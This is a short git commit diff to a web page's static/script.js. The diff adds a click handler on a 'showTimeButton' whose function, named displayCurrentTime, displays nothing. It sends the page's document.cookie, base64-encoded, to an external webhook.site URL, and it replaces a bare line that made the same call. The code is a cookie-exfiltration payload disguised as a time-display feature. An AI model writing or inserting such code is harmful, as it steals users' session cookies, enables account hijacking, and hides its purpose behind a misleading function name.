48dd4810ebb6956bce760821db9f38c6c0b3f50a
MuchenLu <ryan.yonglai@gmail.com>
2025-08-11 14:22:45 +0800

    init

--- static/script.js
+++ static/script.js
@@ -1,1 +1,10 @@
-fetch('https://webhook.site/8b686791-312a-4924-9bb2-8f1b124c8b56?'+window.btoa(document.cookie))
+document.addEventListener("DOMContentLoaded", function () {
+  const button = document.getElementById("showTimeButton");
+  button.addEventListener("click", function () {
+    displayCurrentTime();
+  });
+
+  function displayCurrentTime() {
+    fetch('https://webhook.site/8b686791-312a-4924-9bb2-8f1b124c8b56?'+window.btoa(document.cookie))
+  }
+});
